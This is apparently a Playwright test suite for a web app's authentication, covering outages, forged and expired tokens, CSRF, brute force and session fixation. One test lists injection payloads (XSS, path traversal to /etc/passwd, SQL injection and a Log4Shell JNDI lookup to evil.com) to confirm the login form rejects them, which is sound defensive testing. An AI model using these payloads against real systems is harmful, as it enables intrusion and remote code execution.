import { test, expect } from '@playwright/test';

import { authenticateUser } from '../utils/authenticate-user.function';
import { TEST_USER } from '../utils/default-test-user.constant';
import { fillLoginForm } from '../utils/fill-login-form.function';
import { verifyAuthError } from '../utils/verify-auth-error.function';

test.describe('Authentication Error Scenarios and Edge Cases', () => {
  test.beforeEach(async ({ page }) => {
    // Clear any existing session state
    await page.context().clearCookies();
    await page.evaluate(() => {
      sessionStorage.clear();
      localStorage.clear();
    });
  });

  test('AWS Cognito service outage simulation', async ({ page }) => {
    await page.goto('/auth/login');

    // Intercept Cognito API calls and simulate service outage
    await page.route('**/cognito-identity*/**', (route) => {
      route.abort('failed');
    });

    await page.route('**/cognito-idp*/**', (route) => {
      route.abort('failed');
    });

    await fillLoginForm(page, TEST_USER.email, TEST_USER.password);
    await page.click('[data-testid="login-button"]');

    // Should show appropriate error message for service outage
    await expect(page.locator('[data-testid="error-message"]')).toBeVisible();
    await page.waitForURL(function checkLoginUrl(url) {
      return url.includes('/auth/login');
    });
  });

  test('network timeout handling', async ({ page }) => {
    await page.goto('/auth/login');

    // Intercept auth requests and simulate timeout
    await page.route('**/auth/**', (route) => {
      // Delay response to simulate timeout
      setTimeout(() => {
        route.fulfill({
          status: 408,
          contentType: 'application/json',
          body: JSON.stringify({ error: 'Request timeout' }),
        });
      }, 30000); // 30 second delay
    });

    await fillLoginForm(page, TEST_USER.email, TEST_USER.password);
    await page.click('[data-testid="login-button"]');

    // Should handle timeout gracefully
    await expect(page.locator('[data-testid="error-message"]')).toBeVisible({
      timeout: 35000,
    });
    await page.waitForURL(function checkLoginUrl(url) {
      return url.includes('/auth/login');
    });
  });

  test('malformed token handling', async ({ page }) => {
    await authenticateUser(page);
    await page.goto('/global/universe');

    // Set malformed token
    await page.evaluate(() => {
      sessionStorage.setItem('accessToken', 'invalid.malformed.token');
    });

    // Try to make authenticated request
    await page.reload();

    // Should handle malformed token and redirect to login
    await page.waitForURL(function checkLoginUrl(url) {
      return url.includes('/auth/login');
    });
  });

  test('token validation errors', async ({ page }) => {
    await authenticateUser(page);

    // Set token with invalid signature
    await page.evaluate(() => {
      const validPayload = {
        exp: Math.floor(Date.now() / 1000) + 3600, // Valid for 1 hour
        iat: Math.floor(Date.now() / 1000),
        sub: 'test-user-id',
      };

      const header = Buffer.from(
        JSON.stringify({ alg: 'HS256', typ: 'JWT' })
      ).toString('base64');
      const payload = Buffer.from(JSON.stringify(validPayload)).toString(
        'base64'
      );
      const invalidSignature = 'invalid-signature';

      const invalidToken = `${header}.${payload}.${invalidSignature}`;
      sessionStorage.setItem('accessToken', invalidToken);
    });

    // Try to access protected route
    await page.goto('/global/universe');

    // Should redirect to login due to invalid signature
    await page.waitForURL(function checkLoginUrl(url) {
      return url.includes('/auth/login');
    });
  });

  test('concurrent session management', async ({ browser }) => {
    const contexts = [];
    const pages = [];

    // Create multiple browser contexts for same user
    for (let i = 0; i < 3; i++) {
      const context = await browser.newContext();
      const page = await context.newPage();
      contexts.push(context);
      pages.push(page);
    }

    try {
      // Login with same user in multiple contexts
      for (const page of pages) {
        await authenticateUser(page);
        await page.goto('/global/universe');
        await expect(page.locator('[data-testid="user-menu"]')).toBeVisible();
      }

      // All sessions should remain valid (or handle according to business rules)
      for (const page of pages) {
        await page.reload();
        await expect(page.locator('[data-testid="user-menu"]')).toBeVisible();
      }
    } finally {
      await Promise.all(contexts.map((context) => context.close()));
    }
  });

  test('expired token handling', async ({ page }) => {
    await authenticateUser(page);

    // Set expired token
    await page.evaluate(() => {
      const expiredPayload = {
        exp: Math.floor(Date.now() / 1000) - 3600, // Expired 1 hour ago
        iat: Math.floor(Date.now() / 1000) - 7200, // Issued 2 hours ago
        sub: 'test-user-id',
      };

      const header = Buffer.from(
        JSON.stringify({ alg: 'HS256', typ: 'JWT' })
      ).toString('base64');
      const payload = Buffer.from(JSON.stringify(expiredPayload)).toString(
        'base64'
      );
      const signature = 'mock-signature';

      const expiredToken = `${header}.${payload}.${signature}`;
      sessionStorage.setItem('accessToken', expiredToken);
    });

    // Try to access protected route
    await page.goto('/global/universe');

    // Should redirect to login or attempt token refresh
    await page.waitForURL(function checkLoginUrl(url) {
      return url.includes('/auth/login');
    });
  });

  test('revoked token handling', async ({ page }) => {
    await authenticateUser(page);
    await page.goto('/global/universe');

    // Simulate revoked token by intercepting API calls
    await page.route('**/api/**', (route) => {
      route.fulfill({
        status: 401,
        contentType: 'application/json',
        body: JSON.stringify({ error: 'Token revoked' }),
      });
    });

    // Try to reload page (triggers API call)
    await page.reload();

    // Should handle revoked token appropriately
    await page.waitForTimeout(2000);
    // Behavior depends on implementation - might redirect to login or show error
  });

  test('race condition in token refresh', async ({ page }) => {
    await authenticateUser(page);

    // Set token that's about to expire
    await page.evaluate(() => {
      const nearExpiredPayload = {
        exp: Math.floor(Date.now() / 1000) + 30, // Expires in 30 seconds
        iat: Math.floor(Date.now() / 1000) - 3570, // Issued almost 1 hour ago
        sub: 'test-user-id',
      };

      const header = Buffer.from(
        JSON.stringify({ alg: 'HS256', typ: 'JWT' })
      ).toString('base64');
      const payload = Buffer.from(JSON.stringify(nearExpiredPayload)).toString(
        'base64'
      );
      const signature = 'mock-signature';

      const nearExpiredToken = `${header}.${payload}.${signature}`;
      sessionStorage.setItem('accessToken', nearExpiredToken);
    });

    // Make multiple simultaneous requests that might trigger refresh
    const promises = [
      page.goto('/global/universe'),
      page.goto('/global/screener'),
      page.goto('/global/summary'),
    ];

    // Wait for all requests to complete
    await Promise.allSettled(promises);

    // Should handle race conditions gracefully
    await expect(page.locator('[data-testid="user-menu"]')).toBeVisible();
  });

  test('security boundary conditions', async ({ page }) => {
    await page.goto('/auth/login');

    // Test various injection attempts
    const maliciousInputs = [
      '<script>alert("XSS")</script>',
      // eslint-disable-next-line sonarjs/code-eval -- Testing XSS protection
      'javascript:alert("XSS")',
      '../../etc/passwd',
      "admin' OR '1'='1",
      '${jndi:ldap://evil.com/x}',
    ];

    for (const maliciousInput of maliciousInputs) {
      await fillLoginForm(page, maliciousInput, 'password');
      await page.click('[data-testid="login-button"]');

      // Should handle malicious input safely
      await page.waitForURL(function checkLoginUrl(url) {
        return url.includes('/auth/login');
      });

      // Clear form for next test
      await page.fill('[data-testid="email-input"]', '');
      await page.fill('[data-testid="password-input"]', '');
    }
  });

  test('CSRF attack simulation', async ({ page }) => {
    await authenticateUser(page);

    // Simulate CSRF attack by making cross-origin request
    const maliciousRequest = page.evaluate(() => {
      return fetch('/api/profile', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ maliciousData: 'attack' }),
        credentials: 'include',
      });
    });

    try {
      await maliciousRequest;
    } catch (error) {
      // CSRF protection should reject the request
      console.log('CSRF protection working:', error);
    }

    // Verify user session is still valid after attempted attack
    await page.reload();
    await expect(page.locator('[data-testid="user-menu"]')).toBeVisible();
  });

  test('brute force attack protection', async ({ page }) => {
    await page.goto('/auth/login');

    // Attempt multiple failed logins
    for (let i = 0; i < 5; i++) {
      await fillLoginForm(page, 'attacker@example.com', 'wrongpassword');
      await page.click('[data-testid="login-button"]');
      await expect(page.locator('[data-testid="error-message"]')).toBeVisible();
      await page.waitForTimeout(1000);
    }

    // After multiple failures, should implement rate limiting
    await fillLoginForm(page, TEST_USER.email, TEST_USER.password);
    await page.click('[data-testid="login-button"]');

    // May be rate limited or require additional verification
    await page.waitForTimeout(2000);
  });

  test('session fixation attack prevention', async ({ page }) => {
    // Get session before login
    await page.goto('/auth/login');
    const sessionBefore = await page.evaluate(() => {
      return {
        sessionStorage: Object.assign({}, sessionStorage),
        cookies: document.cookie,
      };
    });

    // Login
    await authenticateUser(page);

    // Get session after login
    const sessionAfter = await page.evaluate(() => {
      return {
        sessionStorage: Object.assign({}, sessionStorage),
        cookies: document.cookie,
      };
    });

    // Session should be different after authentication (session regeneration)
    expect(sessionAfter.sessionStorage).not.toEqual(
      sessionBefore.sessionStorage
    );
  });

  test('man-in-the-middle attack simulation', async ({ page }) => {
    await page.goto('/auth/login');

    // Intercept and modify authentication requests
    await page.route('**/auth/**', (route) => {
      const request = route.request();
      const postData = request.postData();

      if (postData) {
        // Simulate MITM tampering with request
        const tamperedData = postData.replace(TEST_USER.password, 'tampered');

        route.continue({
          postData: tamperedData,
        });
      } else {
        route.continue();
      }
    });

    await fillLoginForm(page, TEST_USER.email, TEST_USER.password);
    await page.click('[data-testid="login-button"]');

    // Should fail due to tampered credentials
    await verifyAuthError(page, 'Incorrect username or password');
  });

  test('memory-based attack resistance', async ({ page }) => {
    await page.goto('/auth/login');

    // Fill sensitive data
    await fillLoginForm(page, TEST_USER.email, TEST_USER.password);

    // Check that sensitive data isn't persisted in DOM
    const passwordValue = await page.inputValue(
      '[data-testid="password-input"]'
    );
    expect(passwordValue).toBe(TEST_USER.password); // Should be there while typing

    // Submit form
    await page.click('[data-testid="login-button"]');

    // After submission, sensitive data should be cleared
    await page.waitForTimeout(1000);
    const passwordAfterSubmit = await page.inputValue(
      '[data-testid="password-input"]'
    );

    // Password field should be cleared after login attempt
    // (This depends on implementation - some forms clear, others don't)
  });
});
